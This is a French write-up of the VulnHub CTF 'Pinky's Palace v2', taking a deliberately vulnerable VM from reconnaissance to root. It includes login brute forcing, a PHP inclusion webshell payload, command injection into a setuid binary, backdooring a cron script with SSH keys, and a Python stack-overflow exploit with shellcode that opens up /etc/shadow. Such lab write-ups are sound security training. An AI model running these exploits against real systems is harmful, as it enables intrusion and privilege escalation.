---
title: "Solution du CTF Pinky's Palace v2 de VulnHub"
tags: [CTF, VulnHub]
---

## Nitro

J'ai dû marcher sur mon lacet quand je me suis lancé sur le CTF [Pinky's Palace: v2](https://vulnhub.com/entry/pinkys-palace-v2,229/).

Il faut dire que la VM ne parvenait pas à récupérer une adresse IP et j'ai donc dû _l'ouvrir_ pour corriger ça.
Derrière, j'ai finalement du lancer un service qui ne parvenait pas à démarrer, car il s'attendait à trouver l'interface réseau `eth0` alors que VirtualBox la nommait d'après ma véritable interface (je suppose que c'est la cause majeure des problèmes réseau sur les vieilles VM de _VulnHub_).

Pour la suite, ce qui était gênant en début de CTF c'était la multitude de possibilités à tester avant de parvenir au résultat espéré.

Une fois un shell récupéré, le CTF nécessite de suivre différentes étapes qui sont bien définies (ouf). 

## Knock, knock

Nmap trouve rapidement un serveur Apache livrant un Wordpress mais aussi 3 ports filtrés :

```
80/tcp    open     http    Apache httpd 2.4.25 ((Debian))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 4.9.4
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|_  /secret/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
--- snip ---
4655/tcp  filtered unknown
7654/tcp  filtered unknown
31337/tcp filtered Elite
```

Pour avoir déjà ce genre de situation sur d'autres CTFs c'est un bon indice qu'on port-knocking est à effectuer.

Dans les dossiers que Nmap a trouvés via son script Lua d'énumération, il y a le dossier secret qui contient un fichier `bambam.txt` que voici :

> 8890  
> 7000  
> 666  
> pinkydb

J'ai logiquement essayé de contacter les ports dans l'ordre, mais je ne voyais aucun changement.

Finalement j'ai jeté un œil à la VM et j'ai du lancer le `knockd` qui n'écoutait pas sur la bonne interface :

`knockd -i <interface réseau> -d`

Autre déception, les ports de la liste n'étaient pas ordonnés correctement, mais heureusement ils ne sont que trois :

```console
$ ncat -v -z 192.168.56.185 7000; ncat -v -z 192.168.56.185 666; ncat -v -z 192.168.56.185 8890; ncat -v 192.168.56.185 4655
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connection refused.
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connection refused.
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connection refused.
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.185:4655.
SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
```

On trouve alors un serveur SSH sur le port 4655, mais aussi un Nginx et une appli custom :

```
7654/tcp  open  http    nginx 1.10.3
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /login.php: Possible admin folder
31337/tcp open  Elite?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, NULL, RPCCheck: 
|     [+] Welcome to The Daemon [+]
|     This is soon to be our backdoor
|     into Pinky's Palace.
```

## Brocouille

Sur le Nginx on trouve une mire de connexion, mais avant j'ai décidé de me plonger sur les autres ports.

Un coup d'œil au code source du Wordpress révèle sa version :

```html
<meta name="generator" content="WordPress 4.9.4" />
```

Mais une recherche sur le mot `plugin` ne donne aucun match. Le wordpress est configuré pour le nom d'hôte `pinkydb`.

J'ai tenté une énumération avec `wpscan` qui n'a remonté aucun plugin nom plus :

```bash
docker run --add-host pinkydb:192.168.56.185 -it --rm wpscanteam/wpscan --url http://pinkydb/ -e ap,at,u --plugins-detection aggressive
```

Juste un utilisateur qu'on aurait pu trouver via le code HTML aussi :

```
[i] User(s) Identified:

[+] pinky1337
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

J'ai ensuite tenté de bruteforcer le compte, mais après avoir atteint 1% de la wordlist _rockyou_ j'ai jeté l'éponge.

J'ai aussi effectué une énumération de fichiers et dossiers à l'aide de `Feroxbuster` et une recherche de sous-domaines avec `ffuf`. Rien n'a été concluant.

## En aparté

Le port 31337 ne semble rien faire de plus que nous renvoyer nos données :

```console
$ ncat 192.168.56.185 31337 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.185:31337.
[+] Welcome to The Daemon [+]
This is soon to be our backdoor
into Pinky's Palace.
=> hello
hello
```

En jouant un peu avec j'ai remarqué que dans certains cas, il retournait quelques octets de plus que ce qu'il recevait.

J'ai alors écrit le script Python suivant :

```python
from time import sleep

from pwnlib.tubes.remote import remote

for size in range(2098, 5048):
    r = remote("192.168.56.185", 31337)
    r.recvuntil(b"=> ")
    r.send(b"A"*size + b"\n")
    r.recv(1)
    buff = r.recv(10000)
    recv_size = len(buff[:-1])
    if size != recv_size:
        print(f"mismatch {size} != {recv_size}")
        print(repr(buff[size+1:]))
    r.close()
    sleep(.5)
```

C'était assez intéressant. Déjà on voit que le binaire leak ce qui semble être des adresses de la stack (du type `0x7fXXXXXX`).

Ensuite en plaçant suffisamment de données on trouve à un moment un entête ELF, ce qui est totalement possible vu que le binaire et les librairies sont chargées en mémoire, mais assez étonnant de le voir à ce moment, car la stack correspond aux adresses hautes et qu'il n'y a pas grand-chose après...


```
mismatch 1975 != 1981
b'P\x04`/\xfe\x7f'
mismatch 1976 != 1981
b'\x04`/\xfe\x7f'
mismatch 1977 != 1981
b'`/\xfe\x7f'
mismatch 1978 != 1981
b'/\xfe\x7f'
mismatch 1979 != 1981
b'\xfe\x7f'
mismatch 1980 != 1981
b'\x7f'
mismatch 1983 != 1985
b'@\x03'
mismatch 1984 != 1985
b'\x03'
mismatch 1991 != 1999
b'\x7fELF\x02\x01\x01\x03'
mismatch 1992 != 1999
b'ELF\x02\x01\x01\x03'
mismatch 1993 != 1999
b'LF\x02\x01\x01\x03'
mismatch 1994 != 1999
b'F\x02\x01\x01\x03'
```

Sur la théorie d'exploiter ce leak pour parvenir à exploiter un stack-overflow, ça semble assez problématique.

Il faudrait trouver une adresse de la libc dans la stack, ce qui est faisable comme le montre l'exécution d'un programme simple que j'ai compilé :

```nasm
[-------------------------------------code-------------------------------------]
   0x40112f <main+9>:   call   0x401030 <puts@plt>
   0x401134 <main+14>:  mov    eax,0x0
   0x401139 <main+19>:  pop    rbp
=> 0x40113a <main+20>:  ret    
   0x40113b:    add    bl,dh
   0x40113d <_fini+1>:  nop    edx
   0x401140 <_fini+4>:  sub    rsp,0x8
   0x401144 <_fini+8>:  add    rsp,0x8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd988 --> 0x7ffff7dcdbb0 (<__libc_start_call_main+130>:  mov    edi,eax)
0008| 0x7fffffffd990 --> 0x7fffffffda80 --> 0x7fffffffda88 --> 0x38 ('8')
0016| 0x7fffffffd998 --> 0x401126 (<main>:      push   rbp)
0024| 0x7fffffffd9a0 --> 0x100400040 
0032| 0x7fffffffd9a8 --> 0x7fffffffda98 --> 0x7fffffffdf43 ("/tmp/test")
0040| 0x7fffffffd9b0 --> 0x7fffffffda98 --> 0x7fffffffdf43 ("/tmp/test")
0048| 0x7fffffffd9b8 --> 0x15ab66a4c2d28ab9 
0056| 0x7fffffffd9c0 --> 0x0
```

On voit qu'au retour du `main` la stack contient l'adresse de retour `__libc_start_call_main+130`.

Cette adresse fait bien parmi de la libc :

```
      0x7ffff7dcc000     0x7ffff7f33000   0x167000    0x26000  r-xp   /usr/lib64/libc.so.6
```

Mais ce n'est pas l'adresse exacte de `__libc_start_call_main` dont le début dépend du nombre d'instructions présentes auparavant.

Il faudrait disposer d'une base de données comme la [libc database](https://libc.blukat.me/) pour déterminer à quelle libc on a à faire dans l'idée de créer une ROP chain.

Mais autre point important : on leake l'adresse qui est en mémoire et non l'offset dans la libc. À moins de pouvoir leaker une seconde adresse de la libc (et rechercher selon un décalage), ce scénario d'exploitation semble vraiment compliqué.


## Blinky

Destination le service Nginx avec la mire de login. Après avoir tenté un bruteforce sans résultat, j'ai généré une wordlist avec le contenu du wordpress.

Vu qu'il n'y a qu'un petit post, la wordlist est courte.

```bash
docker run --add-host pinkydb:192.168.56.185 -it --rm cewl http://pinkydb/ > words.txt
```

J'ai ensuite passé la wordlist pour un bruteforce à la fois sur le nom d'utilisateur et le mot de passe :


```console
$ ffuf -w words.txt:USER -w words.txt:PASS -X POST -d "user=USER&pass=PASS" -H "Content-type: application/x-www-form-urlencoded" -u http://pinkydb:7654/login.php -fr Invalid

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : POST
 :: URL              : http://pinkydb:7654/login.php
 :: Wordlist         : USER: words.txt
 :: Wordlist         : PASS: words.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : user=USER&pass=PASS
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Regexp: Invalid
________________________________________________

[Status: 302, Size: 499, Words: 19, Lines: 26]
    * USER: Pinky
    * PASS: Passione

[Status: 302, Size: 499, Words: 19, Lines: 26]
    * USER: pinky
    * PASS: Passione

:: Progress: [28224/28224] :: Job [1/1] :: 436 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
```

Gotcha ! On est redirigé vers l'URL `http://pinkydb:7654/pageegap.php?1337=filesselif1001.php` et on trouve un lien vers une clé SSH pour un certain stefano ainsi qu'un message à l'URL `http://pinkydb:7654/credentialsdir1425364865/notes.txt`.

Le script `pageegap.php` est vulnérable à une faille d'inclusion PHP. Il n'y a aucun filtre qui est en place.

J'ai préféré ne pas gaspiller de temps et passer via le [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) :

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
```

Plus qu'à placer le filtre en valeur du paramètre `1337` vulnérable et ma commande dans le paramètre `c`.

Je peux alors commencer à fouiller le système :

```php
www-data@Pinkys-Palace:/var/www/html/nginx/pinkydb/html$ cat config.php
<?php
        define('DB_HOST', 'localhost');
        define('DB_USER', 'secretpinkdbuser');
        define('DB_PASS', 'pinkyssecretdbpass');
        define('DB_NAME', 'secretsdb');
        $conn = mysqli_connect(DB_HOST,DB_USER,DB_PASS,DB_NAME);
?>
```

Ce sont les identifiants utilisés pour le code du Nginx. Je trouve aussi ceux du Wordpress :

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'pwp_db');

/** MySQL database username */
define('DB_USER', 'pinkywp');

/** MySQL database password */
define('DB_PASSWORD', 'pinkydbpass_wp');
```

## Inky

En cherchant les fichiers de l'utilisateur `pinky` j'ai trouvé un binaire setuid chez `stefano` :

```console
www-data@Pinkys-Palace:/var/www/html/nginx/pinkydb/html$ find / -user pinky -ls 2>/dev/null 
   917524     16 -rwsr----x   1 pinky    www-data    13384 Mar 16  2018 /home/stefano/tools/qsub
  4587523      4 drwxr-x---   3 pinky    pinky        4096 Mar 17  2018 /home/pinky
```

On dispose aussi de cette note :

```
www-data@Pinkys-Palace:/var/www/html/nginx/pinkydb/html$ cat /home/stefano/tools/note.txt
Pinky made me this program so I can easily send messages to him.
```

Seul `www-data` et `pinky` peuvent lire le binaire, mais tout le monde peut l'exécuter.

Je me suis aussi penché sur la clé privée SSH de `stefano` qu'on a récupéré. Elle est protégée par une passphrase qui n'a pas mis longtemps à tomber (utilisation préalable de `ssh2john`) :

```console
$ john --wordlist=rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
secretz101       (id_rsa)     
1g 0:00:00:00 DONE (2023-04-18 18:14) 2.127g/s 2778Kp/s 2778Kc/s 2778KC/s sectec1..secretsex
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

J'ai recopié le binaire `qsub` avec les droits de `www-data` puis l'ai ouvert avec `Cutter` :

```nasm
0x00000ad1      lea     rdi, str.TERM ; 0xc9b ; const char *name
0x00000ad8      call    getenv     ; sym.imp.getenv ; char *getenv(const char *name)
0x00000add      mov     qword [s2], rax
0x00000ae1      lea     rdi, str.Input_Password: ; 0xca0 ; const char *format
0x00000ae8      mov     eax, 0
0x00000aed      call    printf     ; sym.imp.printf ; int printf(const char *format)
0x00000af2      lea     rax, [s1]
0x00000af6      mov     rsi, rax
0x00000af9      lea     rdi, data.00000cb5 ; 0xcb5 ; const char *format
0x00000b00      mov     eax, 0
0x00000b05      call    __isoc99_scanf ; sym.imp.__isoc99_scanf ; int scanf(const char *format)
0x00000b0a      lea     rax, [s1]
0x00000b0e      mov     rdi, rax   ; const char *s
0x00000b11      call    strlen     ; sym.imp.strlen ; size_t strlen(const char *s)
0x00000b16      cmp     rax, 0x28
0x00000b1a      jbe     0xb32
0x00000b1c      lea     rdi, str.Bad_hacker__Go_away ; 0xcb8 ; const char *s
0x00000b23      call    puts       ; sym.imp.puts ; int puts(const char *s)
0x00000b28      mov     edi, 0     ; int status
0x00000b2d      call    exit       ; sym.imp.exit ; void exit(int status)
0x00000b32      mov     rdx, qword [s2]
0x00000b36      lea     rax, [s1]
0x00000b3a      mov     rsi, rdx   ; const char *s2
0x00000b3d      mov     rdi, rax   ; const char *s1
0x00000b40      call    strcmp     ; sym.imp.strcmp ; int strcmp(const char *s1, const char *s2)
0x00000b45      test    eax, eax
```

Le programme demande un mot de passe qui doit correspondre à la variable d'environnement `TERM`.

On voit ensuite dans le code qu'il fait un `sprintf` de cette chaine avec l'input récupéré :

```bash
/bin/echo %s >> /home/pinky/messages/stefano_msg.txt
```

On obtient alors un shell pinky de cette façon :

```console
stefano@Pinkys-Palace:~/tools$ ./qsub ";bash #"
[+] Input Password: xterm-256color

pinky@Pinkys-Palace:~/tools$ id
uid=1000(pinky) gid=1002(stefano) groups=1002(stefano)
```

## Pinky

En utilisant `pspy` on peut voir qu'une tache crontab est exécutée :

```
2023/04/18 21:15:01 CMD: UID=0    PID=20025  | /usr/sbin/CRON -f 
2023/04/18 21:15:01 CMD: UID=1001 PID=20029  | tar cvzf /home/demon/backups/backup.tar.gz /var/www/html 
2023/04/18 21:15:01 CMD: UID=1001 PID=20027  | /bin/bash /usr/local/bin/backup.sh 
2023/04/18 21:15:01 CMD: UID=1001 PID=20026  | /bin/sh -c /usr/local/bin/backup.sh 
2023/04/18 21:15:01 CMD: UID=1001 PID=20030  | tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
```

Problème : le script exécuté par l'utilisateur `demon` (UID 1001) est lisible pour ceux qui ont le GID `pinky` or le shell qu'on a obtenu a seulement l'UID :

```
   917532      4 -rwxrwx---   1 demon    pinky         113 Mar 17  2018 /usr/local/bin/backup.sh
```

J'ai simplement résolu le problème en créant un fichier `.ssh/authorized_keys` dans le dossier de `pinky` puis en me connectant via SSH.

J'ai alors modifié le script de backup pour rajouter les deux dernières lignes :

```bash
#!/bin/bash

rm /home/demon/backups/backup.tar.gz
tar cvzf /home/demon/backups/backup.tar.gz /var/www/html
mkdir -p /home/demon/.ssh
echo "ssh-rsa AAAA--- snip clé publique ssh snip---WnV7Ez8/h" > /home/demon/.ssh/authorized_keys
```

Et après plusieurs minutes, je pouvais me connecter sur le compte `demon`.

## Clyde

La dernière étape concerne le binaire écoutant sur le port 31337 qu'on a vu plus tôt :

```
root       408  0.0  0.0   4040  1020 ?        Ss   Apr18   0:01 /daemon/panel
root      6416  0.0  0.0   4040    84 ?        S    06:43   0:00 /daemon/panel
```

Le fait que les adresses de la stack qu'on a pu dumper plus tôt ne changeait presque pas était le signe que soit l'ASLR était désactivée, soit que le programme fonctionnait avec un `fork`.

On est ici dans la seconde situation. Une analyse du code assembleur montre que le programme `fork` très tôt (avant le `bind` + `listen`), ce qui explique la temporisation qu'on doit mettre entre deux connexions successives.

Pour résumer la situation d'exploitation :

- ASLR activé
- NX false
- Canary false
- Binaire 64 bits
- Pas de bit setuid
- Fonctionne en tant que root

Le programme reçoit son input via le réseau et le passe ensuite à une fonction nommée `handlecmd` qui fait un `strcpy`, la stack frame étant plus petite que le buffer d'entrée.

J'ai généré une chaine cyclique avec `pwntools` et l'ai donné au binaire lancé avec `gdb` en local :

```
[----------------------------------registers-----------------------------------]
RAX: 0x806 
RBX: 0x7fffffffda98 --> 0x7fffffffdf4e ("/tmp/panel")
RCX: 0x7ffff7ebd1ed (<send+31>: cmp    rax,0xfffffffffffff000)
RDX: 0x806 
RSI: 0x7fffffffc8b0 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
RDI: 0x4 
RBP: 0x6261616562616164 ('daabeaab')
RSP: 0x7fffffffc928 ("faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaad"...)
RIP: 0x4009aa (<handlecmd+70>:  ret)
R8 : 0x0 
R9 : 0x0 
R10: 0x0 
R11: 0x246 
R12: 0x0 
R13: 0x7fffffffdaa8 --> 0x7fffffffdf59 ("SHELL=/bin/bash")
R14: 0x7ffff7ffd000 --> 0x7ffff7fc1000 --> 0x0 
R15: 0x0
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009a3 <handlecmd+63>:     call   0x400790 <send@plt>
   0x4009a8 <handlecmd+68>:     nop
   0x4009a9 <handlecmd+69>:     leave  
=> 0x4009aa <handlecmd+70>:     ret    
   0x4009ab <main>:     push   rbp
   0x4009ac <main+1>:   mov    rbp,rsp
   0x4009af <main+4>:   sub    rsp,0x1050
   0x4009b6 <main+11>:  call   0x400820 <fork@plt>
```

On voit qu'au moment du `ret` on a bien le contrôle sur la stack (et donc l'adresse de retour).

L'offset de l'adresse de retour est 120 :


```python
$ python
Python 3.10.10 (main, Mar 01 2023, 21:10:14) [GCC] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwnlib.util.cyclic import cyclic_gen
>>> g = cyclic_gen()
>>> g.get(2048)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaau'
>>> g.find("faab")
(120, 0, 120)
```

Avec la stack exécutable on va simplement utiliser un gadget pour sauter sur la pile (immédiatement après l'adresse de retour) :


```nasm
0x0000000000400cfb : call rsp
```

J'ai utilisé un shellcode de _Jonathan Salwan_ qui est aussi l'auteur du merveilleux _ROPGadget_ :

```python
import socket
from time import sleep
from struct import pack

call_rsp = 0x400cfb

sock = socket.socket()
sock.connect(("192.168.56.185", 31337))

shellcode = (
    # https://www.exploit-db.com/shellcodes/13915
    # Linux/x64 - setuid(0) + chmod (/etc/passwd 0777) + exit(0) Shellcode (63 bytes)
    b"\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
    b"\x48\x31\xd2\x66\xbe\xff\x01\x48\xbb\xff"
    b"\xff\xff\xff\xff\x64\x6f\x77\x48\xc1\xeb"
    b"\x28\x53\x48\xbb\x2f\x65\x74\x63\x2f\x73"
    b"\x68\x61\x53\x48\x89\xe7\x48\x31\xc0\xb0"
    b"\x5a\x0f\x05\x48\x31\xff\x48\x31\xc0\xb0"
    b"\x3c\x0f\x05"
)

buff = shellcode + b"A" * (120 - len(shellcode)) + pack("<I", call_rsp) + b"AAAA"
sock.send(buff)
sleep(1)
sock.close()
```

Le shellcode change les permissions sur `/etc/shadow` (malgré la description de _exploit-db_) :

```console
demon@Pinkys-Palace:~$ ls -al /etc/shadow
-rwxrwxrwx 1 root shadow 1334 Apr 18 08:32 /etc/shadow
```

J'ai modifié l'entrée de l'utilisateur `root` pour fixer son mot de passe à `devloop` :

```
root:$6$GfGgGREs$IZmnJyN.V4pdvb0aJCCh0568QQT5F3CaN9NTuTwwDHB8r2hhK7JsZ5Jy/D/TVDFbymgQWS0DmtUjwYlZGZBUR/:17608:0:99999:7:::
```

Et c'est fini :

```console
demon@Pinkys-Palace:~$ vi /etc/shadow
demon@Pinkys-Palace:~$ su root
Password: 
root@Pinkys-Palace:/home/demon# id
uid=0(root) gid=0(root) groups=0(root)
root@Pinkys-Palace:/home/demon# cd /root
root@Pinkys-Palace:~# ls
root.txt
root@Pinkys-Palace:~# cat root.txt 

 ____  _       _          _     
|  _ \(_)_ __ | | ___   _( )___ 
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/       
 ____       _                   
|  _ \ __ _| | __ _  ___ ___ 
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!                             
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
```


